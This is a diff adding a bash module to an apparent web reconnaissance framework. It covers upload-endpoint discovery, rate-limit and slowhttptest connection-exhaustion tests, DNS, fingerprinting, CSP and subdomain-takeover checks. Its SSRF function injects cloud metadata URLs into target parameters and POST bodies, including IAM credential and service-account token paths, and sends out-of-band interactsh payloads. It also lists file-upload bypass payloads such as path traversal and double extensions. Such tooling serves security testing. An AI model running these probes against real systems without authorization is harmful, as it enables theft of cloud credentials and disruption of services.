@@ -1,0 +1,565 @@
+# ============================================================
+# Recon Framework - File Upload & Misc Checks Module
+# ============================================================
+
+file_upload_scan() {
+    local target="$1"
+    local output_dir="$2"
+    local upload_dir="$output_dir/file_upload"
+
+    mkdir -p "$upload_dir"
+
+    log_info "Searching for file upload endpoints..."
+    : > "$upload_dir/upload_targets.txt"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+
+    # Check parameterized URLs for upload-related params
+    [[ -s "$param_urls" ]] && \
+        grep -iE '[?&](file|upload|document|image|attachment|avatar|import|export|photo|img|payload)=' \
+            "$param_urls" | head -3 >> "$upload_dir/upload_targets.txt" || true
+
+    # Check crawled content for multipart forms
+    if [[ -d "$output_dir/endpoints" ]]; then
+        grep -rihE 'enctype=.?multipart/form-data' "$output_dir/endpoints"/*.txt 2>/dev/null | \
+            head -3 >> "$upload_dir/upload_targets.txt" || true
+        grep -oihE 'https?://[^"'"'"' ]+' "$output_dir/endpoints"/*.txt 2>/dev/null | \
+            grep -iE '/(upload|uploads|file|files|import|avatar|attachment)s?/?$' | \
+            head -3 | sort -u >> "$upload_dir/upload_targets.txt" || true
+    fi
+
+    sort -u "$upload_dir/upload_targets.txt" -o "$upload_dir/upload_targets.txt" 2>/dev/null || true
+
+    local upload_count
+    upload_count=$(safe_count "$upload_dir/upload_targets.txt")
+    log_ok "Upload endpoints found: $upload_count"
+
+    if [[ "$upload_count" -gt 0 ]]; then
+        log_warn "File upload requires manual testing. See: $upload_dir/manual_tests.txt"
+        cat > "$upload_dir/manual_tests.txt" << 'UPLOADTESTS'
+[Bypass tests - perform manually on each upload endpoint]
+1. Path traversal:      ../../evil.php         ../../../evil.php        ..%2f..%2fevil.php
+2. Null byte:           evil.php%00.jpg        evil.php\x00.jpg
+3. Double extension:    evil.php.jpg           evil.jpg.php
+4. Content-Type spoof:  image/jpeg body with .php extension
+5. Magic bytes:         GIF89a + PHP payload
+6. Unrestricted type:   upload .exe / .svg (SVG XSS) / .html
+7. Polyglot:            JPG + JS payload
+[Unsanitized/arbitrary upload = server stores & SERVES the file without validation]
+UPLOADTESTS
+    fi
+}
+
+rate_limit_test() {
+    local target="$1"
+    local output_dir="$2"
+    local rate_dir="$output_dir/rate_limit"
+
+    mkdir -p "$rate_dir"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing rate limiting (10 rapid requests)..."
+    : > "$rate_dir/rate_test.txt"
+
+    local start_time
+    start_time=$(date +%s%3N)
+
+    for _ in $(seq 1 10); do
+        # Write each code on its own line so grep -c correctly counts individual 429s.
+        curl -sk -o /dev/null -w '%{http_code}\n' --max-time 2 \
+            ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$base_url" 2>/dev/null >> "$rate_dir/rate_test.txt" || true
+    done
+
+    local end_time
+    end_time=$(date +%s%3N)
+    local elapsed=$((end_time - start_time))
+    local rate_429
+    rate_429=$(grep -c "429" "$rate_dir/rate_test.txt" 2>/dev/null || true)
+    rate_429=${rate_429:-0}
+
+    if [[ "$rate_429" -eq 0 && "$elapsed" -lt 5000 ]]; then
+        # Absence of a 429 in 10 requests to the root is common and not itself a
+        # vulnerability — surface it as informational for manual review of sensitive
+        # endpoints (login, OTP, password reset).
+        log_info "No 429 seen on root in 10 reqs — review rate limiting on auth/OTP endpoints"
+    else
+        log_ok "Rate limiting appears present (${rate_429} 429s in ${elapsed}ms)"
+    fi
+
+    # slowhttptest
+    if check_tool slowhttptest; then
+        log_info "Running slowhttptest for connection exhaustion..."
+        slowhttptest -c 100 -H -g -o "$rate_dir/slow" -i 10 -r 200 -t GET -u "$base_url" -x 4 2>&1 | \
+            tee "$rate_dir/slowhttptest.log" | head -3 || true
+    fi
+}
+
+api_discovery() {
+    local output_dir="$1"
+    local api_dir="$output_dir/api_discovery"
+
+    mkdir -p "$api_dir"
+
+    local endpoints_file="$output_dir/endpoints/all_endpoints.txt"
+    [[ -f "$endpoints_file" ]] || return
+
+    log_info "Discovering API endpoints..."
+
+    # /api/ paths
+    grep -oiE 'https?://[^"'"'"'? ]+/api/[a-z0-9/_-]+' "$endpoints_file" 2>/dev/null | \
+        sort -u > "$api_dir/api_endpoints.txt" || true
+
+    # RESTful patterns
+    grep -oiE '/(v[0-9]+/[a-z]+|rest|swagger|openapi|docs/api|api-docs)' "$endpoints_file" 2>/dev/null | \
+        sort -u > "$api_dir/rest_patterns.txt" || true
+
+    # Swagger/OpenAPI specific
+    log_info "Checking for Swagger/OpenAPI documentation..."
+    : > "$api_dir/swagger_endpoints.txt"
+    local base_url
+    base_url=$(grep -oE 'https?://[^/]+' "$endpoints_file" | head -1 2>/dev/null || true)
+    [[ -z "$base_url" ]] && [[ "$(cat "$output_dir/../raw_target" 2>/dev/null)" == http* ]] && base_url=$(cat "$output_dir/../raw_target")
+
+    for swagger_path in /swagger /swagger.json /swagger-ui.html /api/swagger /api/docs /docs/api \
+                        /openapi.json /api/v1/ /api/v2/ /api/v3/ /v1/api /v2/api; do
+        # Confirm it's actually API docs, not just any 200 page.
+        if fp_confirm_content "${base_url}${swagger_path}" '"swagger"[[:space:]]*:|"openapi"[[:space:]]*:|swagger-ui|"paths"[[:space:]]*:[[:space:]]*\{|SwaggerUIBundle'; then
+            echo "${base_url}${swagger_path}" >> "$api_dir/swagger_endpoints.txt"
+        fi
+    done
+
+    # Exposed API docs are useful recon, but not a vulnerability by themselves.
+    [[ -s "$api_dir/swagger_endpoints.txt" ]] && \
+        { log_info "Swagger/OpenAPI documentation found (informational):"; cat "$api_dir/swagger_endpoints.txt"; }
+}
+
+client_storage_inspection() {
+    local target="$1"
+    local output_dir="$2"
+    local cs_dir="$output_dir/client_storage"
+
+    mkdir -p "$cs_dir"
+
+    local chrome_bin=""
+    for c in chromium-browser chromium google-chrome google-chrome-stable /usr/bin/chromium /snap/bin/chromium; do
+        command -v "$c" &>/dev/null && { chrome_bin="$c"; break; }
+    done
+    if [[ -z "$chrome_bin" ]]; then
+        log_warn "Chromium not found - skipping client-storage inspection"
+        return
+    fi
+
+    log_info "Using headless Chromium ($chrome_bin) for client-side storage inspection..."
+
+
+    # Create Selenium script
+    cat > "$cs_dir/dump_storage.py" << 'PYDUMP'
+import sys, json
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+
+chrome_opt = Options()
+chrome_opt.add_argument("--headless")
+chrome_opt.add_argument("--no-sandbox")
+chrome_opt.add_argument("--disable-dev-shm-usage")
+chrome_opt.add_argument("--disable-gpu")
+
+driver = webdriver.Chrome(options=chrome_opt)
+
+urls = sys.stdin.read().strip().split('\n') if not sys.stdin.isatty() else ["$$URL$$"]
+for url in urls:
+    url = url.strip()
+    if not url: continue
+    try:
+        driver.get(url)
+        ls = driver.execute_script("return JSON.stringify(localStorage);")
+        ss = driver.execute_script("return JSON.stringify(sessionStorage);")
+        print(f"[STORAGE] {url} | localStorage: {ls[:500]}")
+        print(f"[STORAGE] {url} | sessionStorage: {ss[:500]}")
+    except Exception as e:
+        print(f"[ERROR] {url} -> {e}")
+
+driver.quit()
+PYDUMP
+
+    # Verify the selenium Python package is available before trying to use it.
+    if ! python3 -c "import selenium" 2>/dev/null; then
+        log_warn "Python 'selenium' package not installed - skipping client-storage inspection"
+        log_info "Install with: pip3 install selenium"
+        return
+    fi
+
+    echo "$target" > "$cs_dir/urls_to_check.txt"
+    [[ -f "$output_dir/live_hosts.txt" ]] && head -5 "$output_dir/live_hosts.txt" >> "$cs_dir/urls_to_check.txt"
+
+    python3 "$cs_dir/dump_storage.py" < "$cs_dir/urls_to_check.txt" 2>&1 | \
+        tee "$cs_dir/storage_findings.txt" | head -5
+
+    if grep -qiE "token|secret|apikey|password|session" "$cs_dir/storage_findings.txt" 2>/dev/null; then
+        log_vuln "Sensitive data in client-side storage!"
+    else
+        log_ok "No obvious sensitive data in client storage"
+    fi
+}
+
+technology_fingerprint() {
+    local target="$1"
+    local output_dir="$2"
+    local tech_dir="$output_dir/tech_fingerprint"
+
+    mkdir -p "$tech_dir"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Running technology fingerprinting..."
+
+    # httpx tech detection
+    if check_tool httpx; then
+        httpx -u "$base_url" -td -title -server -status-code -favicon \
+            -follow-redirects -timeout 5 ${HDR_H[@]+"${HDR_H[@]}"} \
+            -o "$tech_dir/httpx_fingerprint.txt" -silent 2>/dev/null || true
+
+        if [[ -s "$tech_dir/httpx_fingerprint.txt" ]]; then
+            log_ok "Technology detected:"
+            cat "$tech_dir/httpx_fingerprint.txt"
+        fi
+    fi
+
+    # Additional technology detection via headers
+    echo "=== Response Headers ===" >> "$tech_dir/tech_headers.txt"
+    curl -sI --max-time 2 -L ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$base_url" >> "$tech_dir/tech_headers.txt" 2>/dev/null || true
+
+    # Extract interesting headers
+    grep -iE '^Server:|^X-Powered-By:|^X-Generator:|^X-CMS:|^Set-Cookie:|^X-Frame-Options:|^X-Content-Type-Options:|^Strict-Transport-Security:|^Content-Security-Policy:' \
+        "$tech_dir/tech_headers.txt" > "$tech_dir/interesting_headers.txt" 2>/dev/null || true
+}
+
+dns_enum() {
+    local domain="$1"
+    local output_dir="$2"
+    local dns_file="$output_dir/dns_enum.txt"
+
+    log_info "Performing DNS enumeration..."
+
+    {
+        echo "=== A Records ==="
+        dig +short A "$domain" 2>/dev/null || true
+        echo "=== MX Records ==="
+        dig +short MX "$domain" 2>/dev/null || true
+        echo "=== NS Records ==="
+        dig +short NS "$domain" 2>/dev/null || true
+        echo "=== TXT Records ==="
+        dig +short TXT "$domain" 2>/dev/null || true
+        echo "=== AAAA Records ==="
+        dig +short AAAA "$domain" 2>/dev/null || true
+        echo "=== SOA Record ==="
+        dig +short SOA "$domain" 2>/dev/null || true
+        echo "=== CNAME Records ==="
+        dig +short CNAME "$domain" 2>/dev/null || true
+    } | tee "$dns_file"
+
+    # dnsx for additional records
+    if check_tool dnsx; then
+        echo "$domain" | dnsx -a -aaaa -cname -mx -ns -txt -resp -silent | tee -a "$dns_file" 2>/dev/null || true
+    fi
+}
+# ─── CSP (Content Security Policy) Analysis ─────────────────────
+csp_analysis() {
+    local target="$1"
+    local output_dir="$2"
+    local csp_dir="$output_dir/csp_analysis"
+    mkdir -p "$csp_dir"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Analyzing Content Security Policy..."
+
+    local csp_file="$csp_dir/csp.txt"
+    : > "$csp_file"
+    local csp_issues="$csp_dir/csp_issues.txt"
+    # Bug fix: was ": > $csp_issues.txt" which created a double-.txt file
+    # ($csp_issues already ends in .txt). Use the variable directly.
+    : > "$csp_issues"
+
+    local headers
+    headers=$(curl -sk -I --max-time 2 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$base_url" 2>/dev/null)
+
+    local csp_header
+    csp_header=$(echo "$headers" | grep -i '^content-security-policy:' | head -1 | cut -d: -f2-)
+    [[ -z "$csp_header" ]] && { log_warn "No CSP header found"; return; }
+
+    echo "[CSP] $csp_header" >> "$csp_file"
+
+    # Check for CSP weaknesses
+    if echo "$csp_header" | grep -qiE "'none'|unsafe-inline|unsafe-eval|data:|blob:"; then
+        echo "[WEAK CSP] $base_url - uses 'none', unsafe-inline/eval, or data/blob sources" >> "$csp_issues"
+        log_vuln "Weak CSP: uses unsafe directives"
+    fi
+
+    if echo "$csp_header" | grep -qi "*;"; then
+        echo "[WEAK CSP] $base_url - uses wildcard (*)" >> "$csp_issues"
+        log_vuln "Weak CSP: wildcard in sources"
+    fi
+
+    if echo "$csp_header" | grep -qi "script-src.*'self'" && ! echo "$csp_header" | grep -qi "nonce\|hash"; then
+        if ! echo "$csp_header" | grep -qi "unsafe-inline"; then
+            echo "[WEAK CSP] $base_url - script-src 'self' without nonce/hash protection" >> "$csp_issues"
+            log_vuln "Potential CSP bypass: static script-src 'self'"
+        fi
+    fi
+
+    local csp_issues_count
+    csp_issues_count=$(safe_count "$csp_issues")
+    [[ "$csp_issues_count" -gt 0 ]] && log_vuln "CSP issues: $csp_issues_count" || log_ok "CSP appears well-configured"
+}
+
+# ─── Subdomain Takeover Check ───────────────────────────────────
+subdomain_takeover_check() {
+    local target="$1"
+    local output_dir="$2"
+    local takeover_dir="$output_dir/subdomain_takeover"
+    mkdir -p "$takeover_dir"
+
+    log_info "Checking subdomain takeovers..."
+
+    [[ -f "$output_dir/dns_bruteforce/all_subdomains.txt" ]] || return
+
+    : > "$takeover_dir/takeovers.txt"
+
+    if check_tool subzy; then
+        log_info "Running subzy takeover scanner..."
+        if subzy --help 2>&1 | grep -q "Available Commands"; then
+            # New subzy v2+ syntax
+            subzy run --targets "$output_dir/dns_bruteforce/all_subdomains.txt" \
+                --hide_fails --vuln 2>&1 | grep -v '^$' > "$takeover_dir/subzy_results.txt" || true
+        else
+            # Legacy subzy syntax
+            subzy -targets "$output_dir/dns_bruteforce/all_subdomains.txt" \
+                -hide-fallbacks -silent -v 2>&1 | grep -v '^$' > "$takeover_dir/subzy_results.txt" || true
+        fi
+
+        if [[ -s "$takeover_dir/subzy_results.txt" ]]; then
+            python3 "/home/swayamdiktiya/Ai/claude/recon_framework/lib/verify_takeovers.py" \
+                "$takeover_dir/subzy_results.txt" \
+                "$takeover_dir/takeovers.txt"
+            
+            if [[ -s "$takeover_dir/takeovers.txt" ]]; then
+                log_vuln "Subdomain takeovers verified!"
+                cat "$takeover_dir/takeovers.txt"
+            else
+                log_ok "No verified subdomain takeovers found (all subzy results flagged as false positives)"
+            fi
+        else
+            log_ok "No subdomain takeovers detected (subzy clean)"
+        fi
+    else
+        # Manual check for common dangling CNAME patterns
+        log_info "Checking common takeover patterns (subzy not installed)..."
+        local takeover_patterns=(
+            "github.io|github.io|herokuapp.com|s3.amazonaws.com|cloudfront.net|azurewebsites.net"
+            "netlify.app|vercel.app|pages.dev|surge.sh|readthedocs.io|gitbook.io"
+            "unbouncepages.com|bigcartel.com|shopify.com|tumblr.com|wordpress.com|bitbucket.io"
+        )
+
+        while read -r sub; do
+            [[ -z "$sub" ]] && continue
+            local cname
+            cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1)
+            [[ -z "$cname" ]] && continue
+
+            # Only flag when the service page actually reports the resource as unclaimed.
+            local tk_fp='NoSuchBucket|The specified bucket does not exist|There isn.t a GitHub Pages site here|No such app|The requested URL was not found|project not found|Repository not found|This page could not be found|domain.*not.*configured|NoSuchKey|is not a registered|Do you want to register'
+            for pattern in "${takeover_patterns[@]}"; do
+                if echo "$cname" | grep -qiE "$pattern"; then
+                    local tbody
+                    tbody=$(curl -skg --max-time 8 "https://$sub" 2>/dev/null; curl -skg --max-time 8 "http://$sub" 2>/dev/null)
+                    if echo "$tbody" | grep -qiE "$tk_fp"; then
+                        echo "[POTENTIAL TAKEOVER] $sub -> $cname (unclaimed fingerprint matched)" >> "$takeover_dir/takeovers.txt"
+                    fi
+                    break
+                fi
+            done
+        done < "$output_dir/dns_bruteforce/all_subdomains.txt"
+    fi
+}
+
+# ─── Wayback Parameter Mining ───────────────────────────────────
+wayback_param_mining() {
+    local target="$1"
+    local output_dir="$2"
+    local param_dir="$output_dir/param_mining"
+    mkdir -p "$param_dir"
+
+    log_info "Mining Wayback for hidden parameters..."
+
+    [[ -f "$output_dir/endpoints/gau_urls.txt" ]] || return
+
+    : > "$param_dir/wayback_params.txt"
+
+    while read -r url; do
+        [[ -z "$url" ]] && continue
+        [[ "$url" != *\?* ]] && continue
+
+        local base="${url%%\?*}"
+        local query="${url#*\?}"
+
+        # Extract each param
+        while IFS='&' read -ra pairs; do
+            for pair in "${pairs[@]}"; do
+                [[ -z "$pair" ]] && continue
+                local key="${pair%%=*}"
+                [[ -n "$key" ]] && grep -qFx "$key" "$param_dir/wayback_params.txt" || echo "$key" >> "$param_dir/wayback_params.txt"
+            done
+        done <<< "$query"
+    done < "$output_dir/endpoints/gau_urls.txt"
+
+    sort -u "$param_dir/wayback_params.txt" -o "$param_dir/wayback_params.txt"
+
+    local params_count
+    params_count=$(safe_count "$param_dir/wayback_params.txt")
+    [[ "$params_count" -gt 0 ]] && log_ok "Found $params_count potential parameters in Wayback"
+}
+
+# ─── Cloud Metadata SSRF Probes (Priority 7) ───────────────────
+cloud_metadata_ssrf() {
+    local target="$1"
+    local output_dir="$2"
+    local ssrf_dir="$output_dir/ssrf_cloud_metadata"
+    mkdir -p "$ssrf_dir"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Probing for Cloud Metadata SSRF..."
+
+    local ssrf_file="$ssrf_dir/ssrf_findings.txt"
+    : > "$ssrf_file"
+
+    # Cloud metadata endpoints
+    local metadata_urls=(
+        "http://169.254.169.254/latest/meta-data/"               # AWS
+        "http://169.254.169.254/latest/user-data/"
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure
+        "http://metadata.google.internal/computeMetadata/v1/"    # GCP
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+        "http://100.100.100.200/latest/meta-data/"               # Alibaba
+        "http://100.100.100.200/latest/user-data/"
+    )
+
+    # Find param URLs to inject into
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    local inject_targets="$output_dir/fuzz_results/urls_with_params.txt"
+
+    # Also check endpoints that commonly accept URLs
+    local endpoint_file="$output_dir/endpoints/all_endpoints.txt"
+    if [[ -f "$endpoint_file" ]]; then
+        grep -iE '(url|redirect|return|next|load|fetch|proxy|source|page|file|download|path|href|src|link)' \
+            "$param_urls" 2>/dev/null | head -5 > "$ssrf_dir/ssrf_candidates.txt" || true
+        inject_targets="$ssrf_dir/ssrf_candidates.txt"
+    fi
+
+    [[ -s "$inject_targets" ]] || { log_info "No parameterised URLs for SSRF testing"; return; }
+
+    log_info "Injecting cloud metadata URLs into parameters..."
+
+    while read -r url; do
+        [[ -z "$url" ]] && continue
+        local base="${url%%\?*}"
+        local query="${url#*\?}"
+        IFS='&' read -ra pairs <<< "$query"
+
+        for meta_url in "${metadata_urls[@]}"; do
+            for i in "${!pairs[@]}"; do
+                local key="${pairs[$i]%%=*}"
+                [[ -z "$key" ]] && continue
+
+                local new_pairs=()
+                for j in "${!pairs[@]}"; do
+                    [[ "$j" == "$i" ]] && new_pairs+=("${key}=$(echo "$meta_url" | sed 's/[&]/%26/g')") || new_pairs+=("${pairs[$j]}")
+                done
+                local test_url="${base}?$(IFS='&'; echo "${new_pairs[*]}")"
+                local resp
+                resp=$(curl -sk --max-time 3 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+
+                # Check for cloud metadata in response
+                if echo "$resp" | grep -qiE 'ami-id|instance-id|meta-data|computeMetadata|access_key|secret_key|aws_access'; then
+                    echo "[SSRF CLOUD METADATA] key=$key metadata=$meta_url -> $test_url" >> "$ssrf_file"
+                    log_vuln "Cloud metadata accessible via SSRF on param '$key'!"
+                    break 2
+                fi
+            done
+        done
+    done < "$inject_targets"
+
+    # SSRF via POST body (JSON)
+    log_info "Testing SSRF in POST bodies..."
+    [[ -f "$endpoint_file" ]] && grep -iE '/(api|rest|graphql|webhook|proxy|call)' "$endpoint_file" 2>/dev/null | head -3 > "$ssrf_dir/post_endpoints.txt" || true
+
+    while read -r ep; do
+        [[ -z "$ep" ]] && continue
+        for meta_url in "${metadata_urls[@]}"; do
+            local json_payloads=(
+                "{\"url\":\"$meta_url\"}"
+                "{\"proxy\":\"$meta_url\"}"
+                "{\"callback\":\"$meta_url\"}"
+                "{\"target\":\"$meta_url\"}"
+                "{\"endpoint\":\"$meta_url\"}"
+            )
+            for json_payload in "${json_payloads[@]}"; do
+                local resp
+                resp=$(curl -sk --max-time 3 -X POST -H "Content-Type: application/json" \
+                    -d "$json_payload" ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$ep" 2>/dev/null)
+                if echo "$resp" | grep -qiE 'ami-id|instance-id|meta-data|computeMetadata'; then
+                    echo "[SSRF POST] $ep -> $json_payload" >> "$ssrf_file"
+                    log_vuln "Cloud metadata accessible via POST SSRF on $ep!"
+                    break 2
+                fi
+            done
+        done
+    done < "$ssrf_dir/post_endpoints.txt"
+
+    # OOB blind SSRF via interactsh (if -x flag was given)
+    if check_tool interactsh-client; then
+        log_info "Starting blind OOB SSRF detection..."
+        local oob_file="$ssrf_dir/oob_ssrf.txt"
+        : > "$oob_file"
+
+        local interactsh_url
+        interactsh_url=$(interactsh-client -n 2>/dev/null | head -1)
+        if [[ -n "$interactsh_url" ]]; then
+            local oob_payload="http://${interactsh_url}/ssrf-test"
+            # Inject OOB payload into params
+            [[ -s "$inject_targets" ]] && head -3 "$inject_targets" | while read -r url; do
+                [[ -z "$url" ]] && continue
+                local base="${url%%\?*}"
+                local query="${url#*\?}"
+                IFS='&' read -ra pairs <<< "$query"
+                for i in "${!pairs[@]}"; do
+                    local key="${pairs[$i]%%=*}"
+                    [[ -z "$key" ]] && continue
+                    local new_pairs=()
+                    for j in "${!pairs[@]}"; do
+                        [[ "$j" == "$i" ]] && new_pairs+=("${key}=${oob_payload}") || new_pairs+=("${pairs[$j]}")
+                    done
+                    local test_url="${base}?$(IFS='&'; echo "${new_pairs[*]}")"
+                    curl -sk --max-time 2 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null &
+                done
+            done
+            sleep 3
+            log_info "Check interactsh dashboard for callbacks ($interactsh_url)"
+            echo "[OOB SSRF] interactsh URL: $interactsh_url" > "$oob_file"
+            echo "[OOB SSRF] Check the interactsh console for incoming callbacks" >> "$oob_file"
+        fi
+    fi
+
+    local ssrf_hits
+    ssrf_hits=$(safe_count "$ssrf_file")
+    [[ "$ssrf_hits" -gt 0 ]] && log_vuln "SSRF findings: $ssrf_hits" || log_ok "No SSRF detected"
+}
+
